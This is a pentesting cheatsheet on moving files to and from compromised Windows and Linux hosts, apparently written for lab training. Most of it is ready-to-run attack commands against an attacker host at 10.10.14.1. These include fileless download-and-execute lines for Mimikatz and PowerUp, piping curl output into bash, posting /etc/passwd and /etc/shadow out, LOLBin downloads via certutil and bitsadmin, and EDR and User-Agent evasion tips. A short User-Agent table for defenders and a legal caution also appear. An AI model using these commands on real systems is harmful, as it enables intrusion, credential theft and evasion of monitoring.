---
title: "File Transfers"
description: "Windows/Linux, PowerShell, certutil, base64, and smbserver for post-exploitation."
sidebar:
  order: 1
  label: "File Transfers"
---
> File transfer in all pentesting scenarios: Windows ↔ Linux, HTTP/SMB/FTP/nc/SCP methods, LOLBins, encryption, and detection evasion.

---


## Windows — Downloading to Target (from Pwnbox)

### PowerShell — Base64 (No Network)

```bash
# Pwnbox: encode file
cat id_rsa | base64 -w 0; echo
md5sum id_rsa    # verify hash beforehand
```

```powershell
# Windows: decode and save
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_STRING>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5   # verify hash
```

> ⚠️ cmd.exe has an 8191-character limit. If the string is too long, use another method.

### PowerShell — WebClient (HTTP/HTTPS/FTP)

```powershell
# DownloadFile — saves to disk
(New-Object Net.WebClient).DownloadFile('http://10.10.14.1:8000/PowerView.ps1','C:\Users\Public\PowerView.ps1')
(New-Object Net.WebClient).DownloadFileAsync('http://10.10.14.1:8000/PowerView.ps1','C:\Users\Public\PowerView.ps1')

# DownloadString — fileless (runs in memory without touching disk)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/Invoke-Mimikatz.ps1')
(New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/PowerUp.ps1') | IEX

# Invoke-WebRequest (alias: iwr, curl, wget) — PowerShell 3+
Invoke-WebRequest http://10.10.14.1:8000/PowerView.ps1 -OutFile PowerView.ps1

# Fix: IE first-launch config error
Invoke-WebRequest https://<IP>/PowerView.ps1 -UseBasicParsing | IEX

# Fix: SSL/TLS certificate error
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB — impacket-smbserver

```bash
# Pwnbox: create share (without auth — may fail on modern Windows)
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Pwnbox: create share with credentials (for Windows that blocks guest)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
:: Windows: copy from anonymous share
copy \\10.10.14.1\share\nc.exe

:: Windows: mount share with credentials
net use n: \\10.10.14.1\share /user:test test
copy n:\nc.exe
```

### FTP — pyftpdlib

```bash
# Pwnbox: anonymous FTP server
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

```powershell
# Windows: download via PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://10.10.14.1/nc.exe', 'C:\Users\Public\nc.exe')
```

```cmd
:: Windows: FTP client in a non-interactive shell
echo open 10.10.14.1 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET nc.exe >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Windows — Uploading from Target (to Pwnbox)

### PowerShell — Base64 to Pwnbox

```powershell
# Encode in Windows
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

```bash
# Pwnbox: decode
echo "<BASE64>" | base64 -d > hosts
md5sum hosts    # verify
```

### HTTP Upload — uploadserver

```bash
# Pwnbox: install and start server with upload
pip3 install uploadserver
python3 -m uploadserver
# UI at http://0.0.0.0:8000/upload
```

```powershell
# Windows: upload with PSUpload.ps1
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/PSUpload.ps1')
Invoke-FileUpload -Uri http://10.10.14.1:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

```powershell
# Alternative: base64 via POST to nc listener
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://10.10.14.1:8000/ -Method POST -Body $b64
```

```bash
# Pwnbox: capture with nc + decode
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
```

### SMB Upload — WebDAV (SMB over HTTP)

```bash
# Pwnbox: install and start WebDAV
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```cmd
:: Windows: connect and upload
dir \\10.10.14.1\DavWWWRoot
copy C:\Users\john\Desktop\archivo.zip \\10.10.14.1\DavWWWRoot\
copy C:\Users\john\Desktop\archivo.zip \\10.10.14.1\sharefolder\
```

### FTP Upload

```bash
# Pwnbox: FTP server with write permissions
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
# Windows: upload
(New-Object Net.WebClient).UploadFile('ftp://10.10.14.1/hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

```cmd
:: Non-interactive FTP client — upload
echo open 10.10.14.1 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Linux — Downloading to Target (from Pwnbox)

### Base64 (No Network)

```bash
# Pwnbox: encode
cat id_rsa | base64 -w 0; echo
md5sum id_rsa

# Target Linux: decode
echo -n '<BASE64>' | base64 -d > id_rsa
md5sum id_rsa    # verify
```

### wget / curl

```bash
wget http://10.10.14.1:8000/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh http://10.10.14.1:8000/LinEnum.sh
```

### Fileless — Run Without Touching Disk

```bash
curl http://10.10.14.1:8000/LinEnum.sh | bash
wget -qO- http://10.10.14.1:8000/script.py | python3
```

### /dev/tcp — Pure Bash (No External Tools)

```bash
exec 3<>/dev/tcp/10.10.14.1/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

### SCP

```bash
# Enable SSH on Pwnbox first
sudo systemctl enable ssh && sudo systemctl start ssh

# Target: download from Pwnbox
scp user@10.10.14.1:/root/tool.sh .
```

### Language One-liners

```bash
# Python3
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.14.1:8000/LinEnum.sh", "LinEnum.sh")'

# Python2
python2.7 -c 'import urllib;urllib.urlretrieve("http://10.10.14.1:8000/LinEnum.sh", "LinEnum.sh")'

# PHP
php -r '$file = file_get_contents("http://10.10.14.1:8000/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
php -r '$lines = @file("http://10.10.14.1:8000/LinEnum.sh"); foreach ($lines as $line) { echo $line; }' | bash

# Ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("http://10.10.14.1:8000/LinEnum.sh")))'

# Perl
perl -e 'use LWP::Simple; getstore("http://10.10.14.1:8000/LinEnum.sh", "LinEnum.sh");'
```

---

## Linux — Uploading from Target (to Pwnbox)

### HTTP Upload — uploadserver with HTTPS

```bash
# Pwnbox: self-signed certificate + HTTPS server
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Target: upload files
curl -X POST https://10.10.14.1/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Web Server on Target → Pull from Pwnbox

```bash
# Target: start server
python3 -m http.server 8000
python2.7 -m SimpleHTTPServer 8000
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000

# Pwnbox: download the file
wget http://<TARGET_IP>:8000/archivo.txt
```

### SCP Upload

```bash
scp /etc/passwd htb-student@10.10.14.1:/home/htb-student/
```

### Python3 Upload One-liner

```bash
python3 -c 'import requests;requests.post("http://10.10.14.1:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---

## Miscellaneous Methods

### Netcat / Ncat — Direct Transfer

```bash
# Option A: Target listens, Pwnbox sends
## Target (receives)
nc -l -p 8000 > archivo.exe
ncat -l -p 8000 --recv-only > archivo.exe

## Pwnbox (sends)
nc -q 0 <TARGET_IP> 8000 < archivo.exe
ncat --send-only <TARGET_IP> 8000 < archivo.exe

# Option B: Pwnbox listens, target connects (useful if firewall blocks inbound on target)
## Pwnbox (listens + sends)
sudo nc -l -p 443 -q 0 < archivo.exe
sudo ncat -l -p 443 --send-only < archivo.exe

## Target (connects + receives)
nc 10.10.14.1 443 > archivo.exe
ncat 10.10.14.1 443 --recv-only > archivo.exe
cat < /dev/tcp/10.10.14.1/443 > archivo.exe   # without nc
```

### PowerShell Remoting (WinRM — Windows to Windows)

```powershell
# Verify WinRM connectivity
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Create session
$Session = New-PSSession -ComputerName DATABASE01

# Copy to the remote session
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Copy from the remote session
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP — Mounting a Local Folder

```bash
# Linux → Windows via xfreerdp (local folder available at \\tsclient\linux)
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/user/htb/filetransfer

# Linux → Windows via rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

---

## LOLBins — Windows (LOLBAS)

```powershell
# certutil — download (detectable by AMSI)
certutil.exe -verifyctl -split -f http://10.10.14.1:8000/nc.exe
certutil -urlcache -split -f http://10.10.14.1:8000/nc.exe

# certutil — upload (via POST to nc)
certreq.exe -Post -config http://10.10.14.1:8000/ c:\windows\win.ini

# bitsadmin — download
bitsadmin /transfer wcb /priority foreground http://10.10.14.1:8000/nc.exe C:\Temp\nc.exe

# BITS via PowerShell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.14.1:8000/nc.exe" -Destination "C:\Temp\nc.exe"

# JavaScript (cscript) — download
# Create wget.js with the script and run:
cscript.exe /nologo wget.js http://10.10.14.1:8000/PowerView.ps1 PowerView.ps1

# VBScript (cscript) — download
# Create wget.vbs with the script and run:
cscript.exe /nologo wget.vbs http://10.10.14.1:8000/PowerView.ps1 PowerView2.ps1

# GfxDownloadWrapper.exe (Intel GPU driver — if present)
GfxDownloadWrapper.exe "http://10.10.14.1:8000/mimikatz.exe" "C:\Temp\nc.exe"
```

> Full reference: lolbas-project.github.io — search for `/download` or `/upload`

## GTFOBins — Linux

```bash
# openssl — encrypted transfer (nc-style)
## Pwnbox: SSL server
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

## Target: SSL client
openssl s_client -connect 10.10.14.1:80 -quiet > LinEnum.sh
```

> Full reference: gtfobins.github.io — search for `+file download` or `+file upload`

---

## File Encryption

### Windows — Invoke-AESEncryption.ps1

```powershell
# Import script
Import-Module .\Invoke-AESEncryption.ps1

# Encrypt file (generates .aes)
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd_fuerte" -Path .\scan-results.txt

# Decrypt
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd_fuerte" -Path .\scan-results.txt.aes
```

### Linux — openssl enc

```bash
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

---

## Detection Evasion

### Change User-Agent in PowerShell

```powershell
# List available User-Agents
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

# Use Chrome User-Agent
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.14.1:8000/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### Detectable User-Agents (for Defenders)

| Tool | User-Agent on Server |
|-------------|----------------------|
| PowerShell `Invoke-WebRequest` | `WindowsPowerShell/5.1.XXXXX` |
| `certutil` | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8` |
| `Msxml2` | `MSIE 7.0; Windows NT 10.0; Win64` |
| cURL default | `curl/7.XX` |
| wget default | `Wget/1.XX` |

---

## Pitfalls / Gotchas

- Always **verify MD5**: `md5sum` (Linux) / `Get-FileHash -Algorithm md5` (Windows). Corrupted transfers go unnoticed and then fail mysteriously.
- **Base64 with binary files** in cmd.exe is limited to 8191 characters. Use PowerShell or a network method for large binaries.
- **Anonymous impacket-smbserver** is blocked by modern Windows 10/11. Use `-user test -password test` and mount with `net use`.
- **pyftpdlib** on port 21 requires `sudo`. Without `--write`, uploads will fail silently.
- **WebDAV keyword `DavWWWRoot`** is special — recognized by the Mini-Redirector driver. It is not a real directory on the server.
- **certutil** is detected by AMSI as malicious use. Alternate with bitsadmin or less common LOLBins if an EDR is present.
- **Fileless with IEX/curl|bash** leaves traces in memory and process logs even if it does not touch the disk.
- **Do not exfiltrate actual PII/sensitive data** — create dummy files to test DLP. Exfiltrating real data can have legal consequences.
- **RDP /drive:** makes the folder accessible at `\\tsclient\<name>` — it is not visible to other users on the RDP host.
- **SCP with a stolen key** → always `chmod 600 id_rsa` before using it.
- **uploadserver with HTTP** sends files in the clear. Use HTTPS with a certificate when the content is sensitive.

---

## Related Cheatsheets

- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — Transfer payloads and establish reverse shells
- [Linux Privilege Escalation](/en/metodologias/privesc/linux-privilege-escalation/) — Transfer linpeas.sh to the target
- [Windows Privilege Escalation](/en/metodologias/privesc/windows-privilege-escalation/) — Transfer winPEAS, PowerUp to the target
- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — Transfer through pivots
- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — Exfiltrate NTDS.dit, BloodHound data
- [Getting Started](/en/metodologias/fundamentos/getting-started/) — Basic transfers and python http.server
